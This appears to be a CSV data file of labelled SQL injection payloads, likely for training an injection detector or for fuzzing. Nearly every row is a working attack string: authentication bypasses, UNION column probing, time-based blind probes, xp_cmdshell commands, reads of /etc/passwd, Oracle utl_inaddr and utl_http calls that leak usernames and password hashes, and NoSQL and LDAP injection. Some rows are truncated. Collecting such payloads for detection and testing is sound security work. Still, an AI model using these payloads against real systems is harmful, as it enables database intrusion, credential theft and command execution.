"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'#,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1
-',1
 ',1
&',1
^',1
*',1
 or ''-',1
 or '' ',1
 or ''&',1
 or ''^',1
 or ''*',1
-,1
""" """,1
&,1
^,1
*,1
" or ""-",1
" or "" ",1
" or ""&",1
" or ""^",1
" or ""*",1
or true--,1
" or true--
' or true--
) or true--",1
) or true--,1
 or 'x'='x,1
) or ('x')=('x,1
)) or (('x'))=(('x,1
" or x""=""x",1
") or (x"")=(""x",1
")) or ((x""))=((""x",1
or 1=1,1
or 1=1--,1
or 1=1#,1
or 1=1/*,1
admin' --,1
admin' #,1
admin'/*,1
admin' or '1'='1,1
admin' or '1'='1'--,1
admin' or '1'='1'#,1
admin' or '1'='1'/*,1
admin'or 1=1 or ''=',1
admin' or 1=1,1
admin' or 1=1--,1
admin' or 1=1#,1
admin' or 1=1/*,1
admin') or ('1'='1,1
admin') or ('1'='1'--,1
admin') or ('1'='1'#,1
admin') or ('1'='1'/*,1
admin') or '1'='1,1
admin') or '1'='1'--,1
admin') or '1'='1'#,1
admin') or '1'='1'/*,1
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"admin"" --",1
"admin"" #",1
"admin""/*",1
"admin"" or ""1""=""1",1
"admin"" or ""1""=""1""--",1
"admin"" or ""1""=""1""#",1
"admin"" or ""1""=""1""/*",1
"admin""or 1=1 or """"=""",1
"admin"" or 1=1",1
"admin"" or 1=1--",1
"admin"" or 1=1#",1
"admin"" or 1=1/*",1
"admin"") or (""1""=""1",1
"admin"") or (""1""=""1""--",1
"admin"") or (""1""=""1""#",1
"admin"") or (""1""=""1""/*",1
"admin"") or ""1""=""1",1
"admin"") or ""1""=""1""--",1
"admin"") or ""1""=""1""#",1
"admin"") or ""1""=""1""/*",1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
sleep(__TIME__)#,1
1 or sleep(__TIME__)#,1
" or sleep(__TIME__)#
' or sleep(__TIME__)#
 or sleep(__TIME__)=""",1
 or sleep(__TIME__)=',1
1) or sleep(__TIME__)#,1
) or sleep(__TIME__)=,1
) or sleep(__TIME__)=',1
1)) or sleep(__TIME__)#,1
)) or sleep(__TIME__)=,1
)) or sleep(__TIME__)=',1
;waitfor delay '0:0:__TIME__'--,1
);waitfor delay '0:0:__TIME__'--,1
;waitfor delay '0:0:__TIME__'--,1
";waitfor delay '0:0:__TIME__'--
');waitfor delay '0:0:__TIME__'--
);waitfor delay '0:0:__TIME__'--",1
));waitfor delay '0:0:__TIME__'--,1
));waitfor delay '0:0:__TIME__'--,1
"));waitfor delay '0:0:__TIME__'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
 or benchmark(10000000,MD5(1))#",1
" or benchmark(10000000,MD5(1))#",1
"1) or benchmark(10000000,MD5(1))#",1
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
)) or benchmark(10000000,MD5(1))#",1
")) or benchmark(10000000,MD5(1))#",1
OR 1=1,1
OR 1=0,1
OR x=x,1
OR x=y,1
OR 1=1#,1
OR 1=0#,1
OR x=x#,1
OR x=y#,1
OR 1=1--,1
OR 1=0--,1
OR x=x--,1
OR x=y--,1
OR 3409=3409 AND ('pytW' LIKE 'pytW,1
OR 3409=3409 AND ('pytW' LIKE 'pytY,1
HAVING 1=1,1
HAVING 1=0,1
HAVING 1=1#,1
HAVING 1=0#,1
HAVING 1=1--,1
HAVING 1=0--,1
AND 1=1,1
AND 1=0,1
AND 1=1--,1
AND 1=0--,1
AND 1=1#,1
AND 1=0#,1
AND 1=1 AND '%'=',1
AND 1=0 AND '%'=',1
AND 1083=1083 AND (1427=1427,1
AND 7506=9091 AND (5913=5913,1
AND 1083=1083 AND ('1427=1427,1
AND 7506=9091 AND ('5913=5913,1
AND 7300=7300 AND 'pKlZ'='pKlZ,1
AND 7300=7300 AND 'pKlZ'='pKlY,1
AND 7300=7300 AND ('pKlZ'='pKlZ,1
AND 7300=7300 AND ('pKlZ'='pKlY,1
AS INJECTX WHERE 1=1 AND 1=1,1
AS INJECTX WHERE 1=1 AND 1=0,1
AS INJECTX WHERE 1=1 AND 1=1#,1
AS INJECTX WHERE 1=1 AND 1=0#,1
AS INJECTX WHERE 1=1 AND 1=1--,1
AS INJECTX WHERE 1=1 AND 1=0--,1
WHERE 1=1 AND 1=1,1
WHERE 1=1 AND 1=0,1
WHERE 1=1 AND 1=1#,1
WHERE 1=1 AND 1=0#,1
WHERE 1=1 AND 1=1--,1
WHERE 1=1 AND 1=0--,1
ORDER BY 1--,1
ORDER BY 2--,1
ORDER BY 3--,1
ORDER BY 4--,1
ORDER BY 5--,1
ORDER BY 6--,1
ORDER BY 7--,1
ORDER BY 8--,1
ORDER BY 9--,1
ORDER BY 10--,1
ORDER BY 11--,1
ORDER BY 12--,1
ORDER BY 13--,1
ORDER BY 14--,1
ORDER BY 15--,1
ORDER BY 16--,1
ORDER BY 17--,1
ORDER BY 18--,1
ORDER BY 19--,1
ORDER BY 20--,1
ORDER BY 21--,1
ORDER BY 22--,1
ORDER BY 23--,1
ORDER BY 24--,1
ORDER BY 25--,1
ORDER BY 26--,1
ORDER BY 27--,1
ORDER BY 28--,1
ORDER BY 29--,1
ORDER BY 30--,1
ORDER BY 31337--,1
ORDER BY 1#,1
ORDER BY 2#,1
ORDER BY 3#,1
ORDER BY 4#,1
ORDER BY 5#,1
ORDER BY 6#,1
ORDER BY 7#,1
ORDER BY 8#,1
ORDER BY 9#,1
ORDER BY 10#,1
ORDER BY 11#,1
ORDER BY 12#,1
ORDER BY 13#,1
ORDER BY 14#,1
ORDER BY 15#,1
ORDER BY 16#,1
ORDER BY 17#,1
ORDER BY 18#,1
ORDER BY 19#,1
ORDER BY 20#,1
ORDER BY 21#,1
ORDER BY 22#,1
ORDER BY 23#,1
ORDER BY 24#,1
ORDER BY 25#,1
ORDER BY 26#,1
ORDER BY 27#,1
ORDER BY 28#,1
ORDER BY 29#,1
ORDER BY 30#,1
ORDER BY 31337#,1
ORDER BY 1,1
ORDER BY 2,1
ORDER BY 3,1
ORDER BY 4,1
ORDER BY 5,1
ORDER BY 6,1
ORDER BY 7,1
ORDER BY 8,1
ORDER BY 9,1
ORDER BY 10,1
ORDER BY 11,1
ORDER BY 12,1
ORDER BY 13,1
ORDER BY 14,1
ORDER BY 15,1
ORDER BY 16,1
ORDER BY 17,1
ORDER BY 18,1
ORDER BY 19,1
ORDER BY 20,1
ORDER BY 21,1
ORDER BY 22,1
ORDER BY 23,1
ORDER BY 24,1
ORDER BY 25,1
ORDER BY 26,1
ORDER BY 27,1
ORDER BY 28,1
ORDER BY 29,1
ORDER BY 30,1
ORDER BY 31337,1
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
%' AND 8310=8310 AND '%'=',1
%' AND 8310=8311 AND '%'=',1
"and (select substring(@@version,1,1))='X'",1
"and (select substring(@@version,1,1))='M'",1
"and (select substring(@@version,2,1))='i'",1
"and (select substring(@@version,2,1))='y'",1
"and (select substring(@@version,3,1))='c'",1
"and (select substring(@@version,3,1))='S'",1
"and (select substring(@@version,3,1))='X'",1
)%20or%20('x'='x,1
%20or%201=1,1
; execute immediate 'sel' || 'ect us' || 'er',1
"benchmark(10000000,MD5(1))#",1
""";waitfor delay '0:0:__TIME__'--",1
1) or pg_sleep(__TIME__)--,1
"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1
"hi"""""""") or (""""""""a""""""""=""""""""a""""""",1
delete,1
like,1
""" or sleep(__TIME__)#",1
pg_sleep(__TIME__)--,1
*(|(objectclass=*)),1
declare @q nvarchar (200) 0x730065006c00650063 ...,1
 or 0=0 #,1
1) or sleep(__TIME__)#,1
) or ('a'='a,1
; exec xp_regread,1
@var select @var as var into temp end --,1
"1)) or benchmark(10000000,MD5(1))#",1
(||6),1
"a"""""""" or 3=3--""""""",1
""" or benchmark(10000000,MD5(1))#",1
# from wapiti,1
 or 0=0 --,1
1 waitfor delay '0:0:10'--,1
 or 'a'='a,1
"hi or 1=1 --""",1
or a = a,1
 UNION ALL SELECT,1
) or sleep(__TIME__)=',1
")) or benchmark(10000000,MD5(1))#",1
hi' or 'a'='a,1
%,1
limit,1
 or 1=1,1
 or 2 > 1,1
""")) or benchmark(10000000,MD5(1))#",1
hi') or ('a'='a,1
 or 3=3,1
));waitfor delay '0:0:__TIME__'--,1
a' waitfor delay '0:0:10'--,1
"1;(load_file(char(47,101,116,99,47,112,97,115, ...",1
or%201=1,1
1 or sleep(__TIME__)#,1
or 1=1,1
 and 1 in (select var from temp)--,1
 or '7659'='7659,1
 or 'text' = n'text',1
--,1
 or 1=1 or ''=',1
declare @s varchar (200) select @s = 0x73656c6 ...,1
exec xp,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
" or pg_sleep(__TIME__)--""",1
x' AND email IS NULL; --,1
admin' or ',1
 or 'unusual' = 'unusual',1
"1) or benchmark(10000000,MD5(1))#",1
\x27UNION SELECT,1
declare @s varchar(200) select @s = 0x77616974 ...,1
tz_offset,1
sqlvuln,1
"""));waitfor delay '0:0:__TIME__'--",1
||6,1
or%201=1 --,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
or a=a,1
) union select * from information_schema.tables;,1
PRINT @@variable,1
or isNULL(1/0) /*,1
26 %,1
"or """"a""""=""""a""",1
(sqlvuln),1
x' AND members.email IS NULL; --,1
or 1=1--,1
"and 1=( if((load_file(char(110,46,101,120,11 ...",1
0x770061006900740066006F0072002000640065006C00 ...,1
%20'sleep%2050',1
1)) or pg_sleep(__TIME__)--,1
/**/or/**/1/**/=/**/1,1
union all select @@version--,1
",@variable",1
(sqlattempt2),1
or (EXISTS),1
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
%20$(sleep%2050),1
"1 or benchmark(10000000,MD5(1))#",1
%20or%20''=',1
||UTL_HTTP.REQUEST,1
or pg_sleep(__TIME__)--,1
hi' or 'x'='x';,1
) or sleep(__TIME__)=,1
or 'whatever' in ('whatever'),1
; begin declare @var varchar(8000) set @var=' ...,1
"union select 1,load_file('/etc/passwd'),1,1,1;",1
0x77616974666F722064656C61792027303A303A313027 ...,1
exec(@s),1
) or pg_sleep(__TIME__)--,1
union select,1
or sleep(__TIME__)#,1
select * from information_schema.tables--,1
a' or 1=1--,1
a' or 'a' = 'a,1
declare @s varchar(22) select @s =,1
or 2 between 1 and 3,1
or a=a--,1
or '1'='1,1
|,1
or sleep(__TIME__)=',1
or 1 --',1
"or 0=0 #""",1
having,1
a',1
 or isNULL(1/0) /*,1
declare @s varchar (8000) select @s = 0x73656c ...,1
 or 1=1 --,1
char%4039%41%2b%40SELECT,1
order by,1
bfilename,1
having 1=1--,1
") or benchmark(10000000,MD5(1))#",1
or username like char(37);,1
;waitfor delay '0:0:__TIME__'--,1
"or 1=1--""",1
x' AND userid IS NULL; --,1
*/*,1
or 'text' > 't',1
(select top 1,1
"or benchmark(10000000,MD5(1))#",1
);waitfor delay '0:0:__TIME__'--,1
-- &password=,1
group by userid having 1=1--,1
or ''=',1
; exec master..xp_cmdshell,1
%20or%20x=x,1
select,1
a' or 3=3--,1
")) or sleep(__TIME__)=""""""",1
0x730065006c0065006300740020004000400076006500 ...,1
hi' or 1=1 --,1
) or pg_sleep(__TIME__)--,1
%20or%20'x'='x,1
or 'something' = 'some'+'thing',1
exec sp,1
29 %,1
(,1
 or 1=1 --,1
1 or pg_sleep(__TIME__)--,1
0 or 1=1,1
) or (a=a,1
uni/**/on sel/**/ect,1
replace,1
%27%20or%201=1,1
)) or pg_sleep(__TIME__)--,1
%7C,1
x' AND 1=(SELECT COUNT(*) FROM tabname); --,1
&apos;%20OR,1
; or '1'='1',1
declare @q nvarchar (200) select @q = 0x770061 ...,1
1 or 1=1,1
; exec ('sel' + 'ect us' + 'er'),1
23 OR 1=1,1
/,1
anything' OR 'x'='x,1
declare @q nvarchar (4000) select @q =,1
or 0=0 --,1
desc,1
||'6,1
),1
1)) or sleep(__TIME__)#,1
or 0=0 #,1
select name from syscolumns where id = (sele ...,1
hi or a=a,1
*(|(mail=*)),1
password:*/=1--,1
distinct,1
);waitfor delay '0:0:__TIME__'--,1
to_timestamp_tz,1
") or benchmark(10000000,MD5(1))#""",1
%2A%28%7C%28mail%3D%2A%29%29,1
or 1=1 /*,1
)) or sleep(__TIME__)=',1
"or 1=1 or """"=",1
or 1 in (select @@version)--,1
union select * from users where login = char ...,1
x' or 1=1 or 'x'='y,1
 or 3=3 --,1
@variable,1
or '1'='1'--,1
"a"" or 1=1--",1
//*,1
%2A%7C,1
""" or 0=0 --",1
")) or pg_sleep(__TIME__)--""",1
or a = a,1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
 or 1=1,1
 or 1=1 --,1
x' OR full_name LIKE '%Bob%,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
%20or%20''=',1
%20or%20'x'='x,1
)%20or%20('x'='x,1
 or 0=0 --,1
 or 0=0 #,1
"or 0=0 #""",1
 or 1=1--,1
 or '1'='1'--,1
 or 1 --',1
or 1=1--,1
 or 1=1 or ''=',1
"or 1=1 or """"=",1
 or a=a--,1
or a=a,1
) or ('a'='a,1
hi' or 'x'='x';,1
or,1
procedure,1
 or username like '%,1
 or uname like '%,1
 or userid like '%,1
 or uid like '%,1
 or user like '%,1
; exec master..xp_cmdshell,1
; exec xp_regread,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
 UNION SELECT,1
 UNION ALL SELECT,1
 or (EXISTS),1
 (select top 1,1
||UTL_HTTP.REQUEST,1
1;SELECT%20*,1
"<>""'%;)(&+",1
%20or%201=1,1
sqlattempt1,1
 or ''=',1
 or 3=3,1
 or 3=3 --,1
sleep(5)#,1
1 or sleep(5)#,1
" or sleep(5)#
' or sleep(5)#
 or sleep(5)=""",1
 or sleep(5)=',1
1) or sleep(5)#,1
) or sleep(5)=,1
) or sleep(5)=',1
1)) or sleep(5)#,1
)) or sleep(5)=,1
)) or sleep(5)=',1
;waitfor delay '0:0:5'--,1
);waitfor delay '0:0:5'--,1
;waitfor delay '0:0:5'--,1
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--",1
));waitfor delay '0:0:5'--,1
));waitfor delay '0:0:5'--,1
));waitfor delay '0:0:5'--,1
"benchmark(10000000,MD5(1))#",1
"1 or benchmark(10000000,MD5(1))#",1
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
) or benchmark(10000000,MD5(1))#",1
") or benchmark(10000000,MD5(1))#",1
"1)) or benchmark(10000000,MD5(1))#",1
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#",1
pg_sleep(5)--,1
1 or pg_sleep(5)--,1
""" or pg_sleep(5)--",1
 or pg_sleep(5)--,1
1) or pg_sleep(5)--,1
""") or pg_sleep(5)--",1
) or pg_sleep(5)--,1
1)) or pg_sleep(5)--,1
""")) or pg_sleep(5)--",1
)) or pg_sleep(5)--,1
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,1
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,1
SLEEP(5)#,1
SLEEP(5)--,1
"SLEEP(5)=""",1
SLEEP(5)=',1
or SLEEP(5),1
or SLEEP(5)#,1
or SLEEP(5)--,1
"or SLEEP(5)=""",1
or SLEEP(5)=',1
waitfor delay '00:00:05',1
waitfor delay '00:00:05'--,1
waitfor delay '00:00:05'#,1
"benchmark(50000000,MD5(1))",1
"benchmark(50000000,MD5(1))--",1
"benchmark(50000000,MD5(1))#",1
"or benchmark(50000000,MD5(1))",1
"or benchmark(50000000,MD5(1))--",1
"or benchmark(50000000,MD5(1))#",1
pg_SLEEP(5),1
pg_SLEEP(5)--,1
pg_SLEEP(5)#,1
or pg_SLEEP(5),1
or pg_SLEEP(5)--,1
or pg_SLEEP(5)#,1
"\""",1
AnD SLEEP(5),1
AnD SLEEP(5)--,1
AnD SLEEP(5)#,1
&&SLEEP(5),1
&&SLEEP(5)--,1
&&SLEEP(5)#,1
 AnD SLEEP(5) ANd '1,1
&&SLEEP(5)&&'1,1
ORDER BY SLEEP(5),1
ORDER BY SLEEP(5)--,1
ORDER BY SLEEP(5)#,1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,1
RANDOMBLOB(500000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",1
<username>'--,1
RANDOMBLOB(1000000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",1
; --,1
; --,1
); --,1
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
 grant connect to name; grant resource to name; --,1
 or 1=1 --,1
 union (select @@version) --,1
" union (select NULL, (select @@version)) --",1
" union (select NULL, NULL, (select @@version)) --",1
" union (select NULL, NULL, NULL,  (select @@version)) --",1
" union (select NULL, NULL, NULL, NULL,  (select @@version)) --",1
" union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",1
"; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",1
"; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",1
"; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",1
"; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",1
; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,1
; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --,1
; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,1
; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,1
1'1,1
1 exec sp_ (or exec xp_),1
1 and 1=1,1
1' and 1=(select count(*) from tablenames); --,1
1 or 1=1,1
1' or '1'='1,1
1or1=1,1
1'or'1'='1,1
fake@ema'or'il.nl'='il.nl,1
1 and user_name() = 'dbo',1
\'; desc users; --,1
1\'1,1
1' and non_existant_table = '1,1
 or username is not NULL or username = ',1
"1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",1
1 uni/**/on select all from where,1
"true, $where: '1 == 1'",1
", $where: '1 == 1'",1
$where: '1 == 1',1
", $where: '1 == 1'",1
"1, $where: '1 == 1'",1
{ $ne: 1 },1
", $or: [ {}, { 'a':'a",1
" } ], $comment:'successful MongoDB injection'",1
db.injection.insert({success:1});,1
"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",1
|| 1==1,1
 && this.password.match(/.*/)//+%00,1
 && this.passwordzz.match(/.*/)//+%00,1
%20%26%26%20this.password.match(/.*/)//+%00,1
%20%26%26%20this.passwordzz.match(/.*/)//+%00,1
{$gt: ''},1
[$ne]=1,1
;sleep(5000);,1
;sleep(5000);',1
;sleep(5000);+',1
;it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,1
 or 1=1,1
 or '1'='1,1
||utl_http.request('httP://192.168.1.1/')||',1
" || myappadmin.adduser('admin', 'newpass') || '",1
 AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",1
